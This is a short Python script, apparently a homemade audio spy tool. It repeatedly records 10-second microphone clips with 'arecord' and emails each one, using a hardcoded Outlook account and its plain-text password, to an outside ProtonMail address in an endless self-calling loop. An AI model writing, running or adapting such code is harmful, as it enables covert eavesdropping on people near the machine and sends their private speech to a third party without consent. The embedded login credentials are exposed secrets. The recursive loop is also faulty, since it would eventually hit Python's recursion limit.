#!/bin/python3.7

def send_email():

	from asyncore import file_dispatcher
	import email
	from json import encoder
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders, message

	sender_email = "sendregistros@outlook.com"
	receiver_email = "r4ym00nd@protonmail.com"

	message = MIMEMultipart()
	message["From"] = sender_email
	message['To'] = receiver_email
	message['Subject'] = "testeo"

	file = "/usr/bin/hb_records/archivo.mp3"
	attachment = open(file, 'rb')

	obj = MIMEBase('application','octet-stream')
	obj.set_payload((attachment).read())
	encoders.encode_base64(obj)
	obj.add_header('Content-Disposition',"attachment; filename= "+file)

	message.attach(obj)
	my_message = message.as_string()
	email_session = smtplib.SMTP('smtp-mail.outlook.com',587)
	email_session.starttls()
	email_session.login(sender_email,"enviadorderegistros123")
	email_session.sendmail(sender_email,receiver_email,my_message)

	email_session.quit()

def create_record():
	import os
	import time as tm
	os.system('arecord -d 10 /usr/bin/hb_records/archivo.mp3')
	send_email()
	tm.sleep(10)
	create_record()

create_record()